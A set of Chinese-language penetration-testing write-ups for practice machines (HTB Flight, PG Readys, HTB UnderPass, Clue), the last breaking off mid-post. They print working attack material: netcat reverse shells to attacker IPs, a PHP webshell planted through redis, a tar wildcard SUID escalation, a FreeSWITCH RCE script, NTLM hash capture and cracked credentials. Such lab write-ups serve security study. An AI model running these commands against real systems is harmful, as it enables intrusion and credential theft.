[{"content":" Machine Info Difficulty: Hard OS: Windows Nmap Result PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 80/tcp open http syn-ack ttl 127 Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1) | http-methods: | Supported Methods: OPTIONS HEAD GET POST TRACE |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 |_http-title: g0 Aviation 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-29 21:10:16Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing 49668/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49675/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 49676/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49703/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49735/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Enumeration {.wp-block-heading} 80端口是一个机票预订网站，没有什么有用信息。用ffuf遍历也没找到有用信息。用enum4linux查看smb服务:\n允许匿名登录，但无法list shares:\n查看ldap服务是否无需验证就可以请求信息：\n需要认证。转头去看http服务，用ffuf遍历看看是否有子域名：\n发现子域名school. 加入到/etc/hosts 里面并访问:\nRFI -\u0026gt; Steal NTLM 在查看一番后只有这里最让我感觉可疑：\n看到这种链接就会想起LFI，尝试一下：\n请求被拦截. 探索一番后发现后端会拦截包含 .. 的请求\n于是我就尝试了下全局路径：\nLFI成功. 用ffuf遍历了一些常见的配置文件，都没有找到有用的信息。\n此时想到靶机可能还有RFI，尝试一下:\necho \u0026#039;\u0026lt;?php phpinfo(); ?\u0026gt;\u0026#039; \u0026gt; phpinfo.php # 在网页请求 http://school.flight.htb/index.php?view=http://10.10.16.8/phpinfo.php 虽然访问成功，但php并没有执行。此时想到了还可以让靶机想我请求smb连接. 先开启responder监听：\nsudo responder -I tun0 #然后再请求 http://school.flight.htb/index.php?view=//10.10.16.8/test 原理：当windows环境内的php遇到诸如 //x.x.x.x/xxx 这样的路径时，会把这个地址理解为UNC路径，即 //服务器/共享名/文件名. 随后系统识别路径为网络路径，于是发起smb连接。（p.s. 在linux环境下则不行） Initial Foothold 截取到了svc_apache的NTLMv2 hash，交给john本地爆破:\njohn --wordlist=/usr/share/wordlists/rockyou.txt apahash Using default input encoding: UTF-8 Loaded 1 password hash (netntlmv2, NTLMv2 C/R \u0026#x5B;MD4 HMAC-MD5 32/64]) Will run 4 OpenMP threads Press \u0026#039;q\u0026#039; or Ctrl-C to abort, almost any other key for status S@Ss!K@*t13 (svc_apache) 1g 0:00:00:02 DONE (2025-05-30 22:30) 0.3663g/s 3906Kp/s 3906Kc/s 3906KC/s SADSAM..S42150461 Use the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliably Session completed. 获取密码 S@Ss!K@*t13 有了密码后则可以用bloodhound-python远程拉取AD架构信息：\n上传到bloodhound并分析：\n可惜的是SVC_APACHE好像并不能做什么. 但目前获得了域内的用户：\nS.Moon R.Cold G.Lors L.Kein M.Gold C.Bum W.Walker I.Francis D.Truff V.Stevens svc_apache O.Possum WebDevs 用crackmapexec尝试看有没有密码复用：\nS.Moon复用了密码. 但从bloodhound上看, S.Moon也没用什么特殊的权限. 用crackmapexec看看S.Moon的smb权限：\nUsers像是在C:/Users下\n但并没有找到有用的信息。对Shared有写入权限，登录并查看：\n里面是空的. 再看看Web\nWeb下是两个网站的根目录，但也没有有用的信息。在这个地方卡了许久，也确实是涉及到我的知识盲区了。看了一眼小提示，发现了这个github repo. 这个工具可以生成一系列用来窃取NTLM hash的文件，其中有的只需要有人浏览包含这个文件的目录就可以窃取NTLM hash.\n原理：当用户在Windows资源管理器中浏览文件夹时，系统会读取文件的元数据来显示图标、缩略图等. 把缩略图加载地址换为攻击者的服务器则可能窃取NTLM hash. 在这个过程中不需要用户点击或打开文件. clone下来运行：\n然后把这些文件全部上传至shared这个共享文件夹:\n有些上传失败了，不知道什么原因。但好在过了一会后抓取到了c.bum的hash：\n交给john来破解并得到c.bum的密码 c.bum: Tikkycoll_431012284\n在bloodhound里可以看到c.bum属于webdavs这个组:\n猜测c.bum可以修改web文件夹. 如果可以，那我们就能上传一个webshell获得RCE,用crackmapexec查看c.bum smb权限：\n对Web有读写权限，那我们就可以上传一个webshell了:\n打开浏览器访问:\n成功。用generator生成一个ps的reverse shell:\n获得shell\nLateral Movement 因为我们已经有了c.bum的密码，则可以利用runas来以c.bum的身份来运行指令，但windows原生的runas需要一个interactive shell来输入密码。利用RunasCs这个工具可以直接输入命令行输入密码. 上传RunasCs并运行:\n获得c.bum的shell:\n在c.bum的desktop下可以找到User flag.\n用netstat -ano查看开放端口发现了一个在内网开放的8000端口:\n同时在C盘下发现了inetpub文件夹，这个文件夹一般是IIS服务的根目录. 在下面发现了一个development的文件夹，猜测可能是内网8000端口开放的IIS http服务器。c.bum对这个文件有写权限:\n一般情况下，IIS服务使用的是一个虚拟账号IIS AppPool\\DefaultAppPool 而作为一个服务账号，一般默认会开启Impersonate权限。我们可以利用ligolo-ng来把内网端口forward到我们本地。先上传一个aspx的webshell：\n上传agent.exe\n本地开启ligolo服务器，并用agent连接：\nligolo有一个\u0026quot;magic ip\u0026quot; 240.0.0.1, 当把路由地址设置为这个地址时，可以用kali连接240.0.0.1来访问靶机的本地端口. 设置完毕后，浏览器访问240.0.0.1:8000 :\n访问cmd.aspx：\n确实是IIS AppPool\\DefaultAppPool这个账号：\n也可以看到确实开启了Impersonate权限。接下来利用之前上传的nc.exe来获取这个用户的shell：\nC:\\xampp\\htdocs\\flight.htb\\nc.exe 10.10.16.8 7777 -e cmd.exe Privilege Escalation 因为不确定defaultapppool可以在哪些文件下读写，于是直接把xxxxPotato下载到Public/Documents下：\n尝试了JuicyPotato, PrintSpoofer, GodPotato. 最后GodPotato成功。\n在Administrator下找到root flag:\nHappy Hacking\n","date":"2025-05-30T13:46:56Z","image":"https://jojobei.github.io/legacy/uploads/2025/05/1748606734-a7af9035e5089332dfbfeb328d663f3e-150x150.webp","permalink":"https://jojobei.github.io/htb-flight-Writeup/","title":"HTB-Flight-Writeup"},{"content":" Difficulty: Linux Community Rate: Very Hard OS: Windows Nmap result PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r | 256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA= | 256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+ 80/tcp open http syn-ack ttl 61 Apache httpd 2.4.38 ((Debian)) |_http-server-header: Apache/2.4.38 (Debian) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-generator: WordPress 5.7.2 |_http-title: Readys \u0026#8211; Just another WordPress site 6379/tcp open redis syn-ack ttl 61 Redis key-value store Initial Foothold 80 HTTP 类似于一个个人博客，大标题上有说用了wordpress\n直接用wpsscan扫描一下：\nwpscan --url http://192.168.201.166/ -e vp --plugins-detection mixed --api-token token 扫描出来Site Editor这个插件有LFI漏洞，搜索一下CVE-2018-7422，在ExploitDatabase找到相应POC。\n尝试访问这个URI：\n漏洞存在。获得用户名alice，因为22 ssh端口开放，尝试下能否获得用户的id_rsa. 可惜找不到文件. 再尝试下.bash_history是否存在:\n也没有，但可以直接获得local.txt\n尝试找一下webroot：\n应该就是在/var/www/html/ 这下面 如文件不存在则会返回Not Found.\n暂且搁置80, 看看其他的端口。6379端口显示是redis服务器：\ngoogle一下是什么：\nRedis（Remote Dictionary Server）是一个开源的内存数据结构存储系统，主要用于缓存、消息队列和高性能键值数据库场景。\n在Hacktricks里能找到渗透redis的方法. 先安装对应的工具, 并尝试连接:\nsudo apt-get install redis-tools redis-cli -h 192.168.201.166 192.168.201.166:6379\u0026gt;info NOAUTH Authentication required. 服务器开启了验证, 需要先拿到credential. Hacktricks里也提到了redis.conf文件里可能会包含验证所需的密码。在网上找了一圈redis.conf location后在/etc/redis/redis.conf找到这个文件:\n在文中找到密码 Ready4Redis? 尝试验证：\n验证成功.\nHacktricks中也提到，可以利用redis-cli在服务器上创建文件 可以尝试上传一个webshell\n尝试了很多位置，都以error结束。\n然后又尝试了hacktricks里提到的: radis-rogue-server 但这个项目是好多年前的了，用了几个类似的exploit全都不管用. 卡在这里了很久, 看了别人的writeup都可以运行, 我这边无论如何都不能跑. 无奈去看了官方的Writeup, 受益匪浅.\n官方Writeup则是先利用LFI查看/etc/systemd/system/redis.service中的信息. 这个文件中包含了服务的各种配置，例如哪里可读，哪里可写：\n尝试在/opt/redis-files下写入文件：\n192.168.201.166:6379\u0026gt; config set dir /opt/redis-files OK 192.168.201.166:6379\u0026gt; config set dbfilename redis.php OK 192.168.201.166:6379\u0026gt; set test \"\u0026lt;?php system($_GET\u0026#x5B;\u0026#039;cmd\u0026#039;]); ?\u0026gt;\" OK 192.168.201.166:6379\u0026gt; save OK 终于成功，接下来就可以利用LFI来访问刚刚创建的php文件.\n成功执行命令. 尝试获得reverse shell:\n没有连接.. 可能是编码的问题？用url编码试试. 随便找了个url encoder网站：\n再次尝试：\n成功获得shell. 用python升级一下刀tty shell.\npython3 -c \u0026#039;import pty;pty.spawn(\"/bin/bash\")\u0026#039; 在alice home下找到local.txt\nRoot 上传linpeas并运行：\nalice@readys:/home/alice$ curl -o lin http://192.168.45.202/linpeas curl -o lin http://192.168.45.202/linpeas % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 3151k 100 3151k 0 0 430k 0 0:00:07 0:00:07 --:--:-- 488k alice@readys:/home/alice$ chmod +x lin chmod +x lin alice@readys:/home/alice$ ./lin 发现root运行了一个cronjob, 看看这个文件里是什么:\ncat /usr/local/bin/backup.sh #!/bin/bash cd /var/www/html if [ $(find . -type f -mmin -3 | wc -l) -gt 0 ]; then tar -cf /opt/backups/website.tar * fi 这个任务会先进入/var/www/html, 并把目录下的文件打包起来。***** 使得我们可以把文件名当做参数传递给 tar. 看到tar 和 * 就能想到wildcard attack了，之前有做过这样的靶机. 这篇博客里有详细教程.\ncd /var/www/html echo \"12312331232231\" \u0026gt; \u0026#039;--checkpoint=1\u0026#039; echo \"1212331232231312\" \u0026gt; \u0026#039;--checkpoint-action=exec=sh pe.sh\u0026#039; echo \"chmod u+s /bin/bash\" \u0026gt; pe.sh 登记分钟后, /bin/bash就会被加上 suid:\nalice@readys:/var/www/html$ ls -l /bin/bash ls -l /bin/bash -rwsr-xr-x 1 root root 1168776 Apr 18 2019 /bin/bash alice@readys:/var/www/html$ /bin/bash -p /bin/bash -p bash-5.0# id id uid=1000(alice) gid=1000(alice) euid=0(root) groups=1000(alice) bash-5.0# cd /root cd /root bash-5.0# ls ls proof.txt 在root下找到proof.txt\n我学到了什么 /etc/systemd/system/xxx.service文件 包含有service的信息 例如读写权限 Happy Hacking\n","date":"2025-05-28T08:43:08Z","image":"https://jojobei.github.io/legacy/uploads/2025/03/1743336789-gura-150x150.jpg","permalink":"https://jojobei.github.io/oscp-pgp-readys-writeup/","title":"OSCP-PGP Readys Writeup"},{"content":" Difficulty: Easy OS: Linux Nmap result PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo= | 256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works | http-methods: |_ Supported Methods: POST OPTIONS HEAD GET |_http-server-header: Apache/2.4.52 (Ubuntu) Enumeration 80端口是apache的默认网页，用ffuf遍历directory和files：\nffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.11.48/FUZZ server-status [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 215ms] :: Progress: [29999/29999] :: Job [1/1] :: 190 req/sec :: Duration: [0:02:48] :: Errors: 1 ::\nffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u http://10.10.11.48/FUZZ\nindex.html [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 370ms] .htaccess [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 239ms] . [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 191ms] .html [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 189ms] .php [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 332ms] .htpasswd [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 198ms] .htm [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 190ms] .htpasswds [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 191ms] .htgroup [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 195ms] wp-forum.phps [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 191ms] .htaccess.bak [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 190ms] .htuser [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 189ms] .htc [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 190ms] .ht [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 270ms] 都是些默认的网页，没有任何有用的信息。扫描一下UDP端口看看：\nsudo nmap -sU --top-ports 200 10.10.11.48 Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-13 00:03 AEST Nmap scan report for 10.10.11.48 Host is up (0.19s latency). Not shown: 197 closed udp ports (port-unreach) PORT STATE SERVICE 161/udp open snmp 1812/udp open|filtered radius 1813/udp open|filtered radacct 161 snmp开放，用snmpwalk看看有什么信息：\n显示出了一个用户名steve@underpass.htb 先做记录 并知道部署了名为daloradius的服务？尝试http下访问/daloradius试试：\n显示forbidden，但知道确实是有这个目录的 用feroxbuster递归遍历/daloradius下有什么目录:\nInitial Foothold 访问了几个全是404 Not Found 谷歌搜了一下，找到了daloradius的github repo. 在 /app/users/ 和 /app/operators/ 下分别发现了login.php\n查看operators下面的login.php，应该是admin用户的登录界面：\n尝试弱口令爆破 admin:admin root:root 之类的都失败。谷歌搜索daloradius默认密码:\n搜到了administrator:radius 尝试登录试试:\n登陆成功. 在config-\u0026gt;Database Settings 下找到了steve登录数据库的密码 先做记录:\n在Management-\u0026gt; List Users下发现了用户svcMosh的密码hash：\n尝试了用rockyou.txt 爆破但失败 用在线的hash cracker爆破试试 得到了密码 underwaterfriends\n尝试用得到的两个creds ssh登录：\nsvcMosh登陆成功，在svcMosh home下得到user flag\nRoot svcMosh 可以以root运行mosh-server 尝试运行一下\nsvcMosh@underpass:~$ sudo -l Matching Defaults entries for svcMosh on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User svcMosh may run the following commands on localhost: (ALL) NOPASSWD: /usr/bin/mosh-server\nsvcMosh@underpass:~$ sudo /usr/bin/mosh-server\nMOSH CONNECT 60001 8wj02XSCCavC9qc0IZjfgg\nmosh-server (mosh 1.3.2) [build mosh 1.3.2] Copyright 2012 Keith Winstein \u0026lt;mosh-devel@mit.edu\u0026gt; License GPLv3+: GNU GPL version 3 or later \u0026lt;http://gnu.org/licenses/gpl.html\u0026gt;. This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law.\n[mosh-server detached, pid = 2139] 显示mosh-server版本1.3.2 谷歌一下这个mosh-server 是一个remote shell 在官网下可以找到连接方式. 尝试用这个方法连接试试\nMOSH_KEY=dR19ewhTJqeSCt+il21otA mosh-client 127.0.0.1 60001 连接后获得了root权限 并在当前目录下找到root.txt\nHappy Hacking\n","date":"2025-05-12T16:01:18Z","image":"https://jojobei.github.io/legacy/uploads/2025/05/1747065644-456a4d2e52f182847fb0a2dba0420a44.webp","permalink":"https://jojobei.github.io/htb-underpass-Writeup/","title":"HTB-UnderPass-Writeup"},{"content":" Difficulty: Hard Community Rate: Very Hard OS: Linux Nmap Results Not shown: 65529 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r | 256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA= | 256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+ 80/tcp open http syn-ack ttl 61 Apache httpd 2.4.38 |_http-title: 403 Forbidden | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST |_http-server-header: Apache/2.4.38 (Debian) 139/tcp open netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack ttl 61 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP) 3000/tcp open http syn-ack ttl 61 Thin httpd |_http-title: Cassandra Web |_http-server-header: thin |_http-favicon: Unknown favicon MD5: 68089FD7828CD453456756FE6E7C4FD8 | http-methods: |_ Supported Methods: GET HEAD 8021/tcp open freeswitch-event syn-ack ttl 61 FreeSWITCH mod_event_socket Enumeration 两个HTTP服务端口，先看80：\n直接就是无权访问，用ffuf尝试遍历：\nffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://192.168.170.240/FUZZ -fw 770 backup [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 193ms] 找到一个文件夹backup，访问一下也是403 forbidden。端口3000下好像是一个数据库的页面服务：\n谷歌搜了一下发现了这个文章 CVE-2021-44521, 以及一个github的POC. 手动尝试文章描述的方法，但会提示用户无权限. （这里截不到显示的信息，总之就是登录的用户cassie无权限\n靶机还开放了SMB服务，用enum4linux扫描一下：\nenum4linux 192.168.x.240 ... Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers backup Disk Backup web directory shares IPC$ IPC IPC Service (Samba 4.9.5-Debian) .... smb服务允许匿名登录，并发现了一个share backup. 登录并查看：\nsmbclient //192.168.170.240/backup Password for \u0026#x5B;WORKGROUP\\kali]: Try \"help\" to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Fri Aug 5 18:43:50 2022 .. D 0 Fri Aug 5 18:43:44 2022 freeswitch D 0 Fri Aug 5 18:43:51 2022 cassandra D 0 Sat May 7 01:04:47 2022 发现了两个文件夹，下载下来查看:\nsmb: \\\u0026gt; recurse ON smb: \\\u0026gt; prompt OFF smb: \\\u0026gt; mget * ...... 手动看了一下，应该是安装的两个软件的备份文件？因为3000端口上运行着cassandra， 8021端口上运行着freeswitch. 在下载下来的文件里发现了freeswitch版本为1.2.7：\nInitial Foothold 用searchsploit搜一下看有没有对应的exploit:\n找到了一个1.10.1版本的RCE，复制下来并查看：\n#!/usr/bin/python3 from socket import * import sys\nif len(sys.argv) != 3: print('Missing arguments') print('Usage: freeswitch-exploit.py \u0026lt;target\u0026gt; \u0026lt;cmd\u0026gt;') sys.exit(1)\nADDRESS=sys.argv[1] CMD=sys.argv[2] PASSWORD='ClueCon' # default password for FreeSWITCH\ns=socket(AF_INET, SOCK_STREAM) s.connect((ADDRESS, 8021))\nresponse = s.recv(1024) if b'auth/request' in response: s.send(bytes(f'auth {PASSWORD}\\n\\n', 'utf8')) response = s.recv(1024) print(response) if b'+OK accepted' in response: print('Authenticated') s.send(bytes('api system {}\\n\\n'.format(CMD), 'utf8')) response = s.recv(8096).decode() print(response) else: print('Authentication failed') sys.exit(1) else: print('Not prompted for authentication, likely not vulnerable') sys.exit(1) 这个script用默认密码ClueCon来验证后，再尝试执行命令。直接运行一下试试：\npython3 47799.py 192.168.170.240 \u0026#039;whoami\u0026#039; b\u0026#039;Content-Type: command/reply\\nReply-Text: -ERR invalid\\n\\n\u0026#039; Authentication failed 显示验证失败，应该是密码被改了。看下cassandra有没有exploit:\n有一个Remote File Read的exploit，复制下来试一下：\npython3 49362.py -p 3000 192.168.170.240 \u0026#039;/etc/passwd\u0026#039; root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin sshd:x:105:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin ntp:x:106:113::/nonexistent:/usr/sbin/nologin cassandra:x:107:114:Cassandra database,,,:/var/lib/cassandra:/usr/sbin/nologin cassie:x:1000:1000::/home/cassie:/bin/bash freeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/false anthony:x:1001:1001::/home/anthony:/bin/bash 能用，发现了用户cassie和anthony. 另外，这个exploit里有提示:\ncat 49362.py ..... # Usage # \u0026gt; cassmoney.py 10.0.0.5 /etc/passwd # root:x:0:0:root:/root:/bin/bash # daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin # bin:x:2:2:bin:/bin:/usr/sbin/nologin # # \u0026gt; cassmoney.py 10.0.0.5 /proc/self/cmdline # /usr/bin/ruby2.7/usr/local/bin/cassandra-web--usernameadmin--passwordP@ssw0rd # # (these creds are for auth to the running apache cassandra database server) .... 可以用第二条指令来dump 运行cassandra-web时的用户名和密码，尝试:\npython3 49362.py -p 3000 192.168.170.240 \u0026#039;/proc/self/cmdline\u0026#039; /usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330 获得了cassie的密码SecondBiteTheApple330. SSH/22端口开启，尝试以cassie登录:\nssh cassie@192.168.170.240 cassie@192.168.170.240\u0026#039;s password: Permission denied, please try again. 失败，可能是不允许cassie ssh登录？尝试用这个密码以Anthony登录看看有没有密码复用，但也失败。\n在下载下来的freeswitch目录下运行grep查找密码：\nfreeswitch grep -r password etc/freeswitch/autoload_configs/event_socket.conf.xml: \u0026lt;param name=\"password\" value=\"ClueCon\"/\u0026gt; 发现了这个文件 event_socket.conf.xml 结合上面freeswitch的exploit, ClueCon是这个软件的默认密码，密码应该就保存在这个文件里。我们又可以用另一个cassandra的exploit任意读取文件，那么应该就可以获取正在运行的freeswitch的密码：\npython3 49362.py -p 3000 192.168.170.240 \u0026#039;/etc/freeswitch/autoload_configs/event_socket.conf.xml\u0026#039; \u0026lt;configuration name=\u0026ldquo;event_socket.conf\u0026rdquo; description=\u0026ldquo;Socket Client\u0026rdquo;\u0026gt; \u0026lt;settings\u0026gt; \u0026lt;param name=\u0026ldquo;nat-map\u0026rdquo; value=\u0026ldquo;false\u0026rdquo;/\u0026gt; \u0026lt;param name=\u0026ldquo;listen-ip\u0026rdquo; value=\u0026ldquo;0.0.0.0\u0026rdquo;/\u0026gt; \u0026lt;param name=\u0026ldquo;listen-port\u0026rdquo; value=\u0026ldquo;8021\u0026rdquo;/\u0026gt; \u0026lt;param name=\u0026ldquo;password\u0026rdquo; value=\u0026ldquo;StrongClueConEight021\u0026rdquo;/\u0026gt; \u0026lt;/settings\u0026gt; \u0026lt;/configuration\u0026gt; 成功获得现在的密码，修改exploit里的密码为StrongClueConEight021并运行：\n成功获得RCE，使用https://www.revshells.com/ 生成一个reverse shell，打开监听尝试:\npython3 47799.py 192.168.170.240 \u0026#039;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2\u0026gt;\u00261|nc 192.168.45.238 8021 \u0026gt;/tmp/f\u0026#039; nc -nlvp 8021 listening on [any] 8021 \u0026hellip; connect to [192.168.45.238] from (UNKNOWN) [192.168.170.240] 41968 sh: 0: can't access tty; job control turned off $ id uid=998(freeswitch) gid=998(freeswitch) groups=998(freeswitch) $ 成功获得shell，可以用之前获得的cassie的密码 su到cassie\nsu cassie Password: SecondBiteTheApple330 id uid=1000(cassie) gid=1000(cassie) groups=1000(cassie) Root 先用python升级一下shell, 又发现cassie可以以sudo运行/usr/local/bin/cassandra-web, 运行一下看看：\npython -c \u0026#039;import pty; pty.spawn(\"/bin/bash\")\u0026#039; cassie@clue:/$ sudo -l sudo -l Matching Defaults entries for cassie on clue: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User cassie may run the following commands on clue: (ALL) NOPASSWD: /usr/local/bin/cassandra-web\ncassie@clue:/$ sudo /usr/local/bin/cassandra-web sudo /usr/local/bin/cassandra-web I, [2025-04-25T09:54:22.528305 #1828] INFO \u0026ndash; : Establishing control connection W, [2025-04-25T09:54:22.530872 #1828] WARN \u0026ndash; : Host 127.0.0.1 refused all connections Cassandra::Errors::AuthenticationError: Server requested authentication, but client was 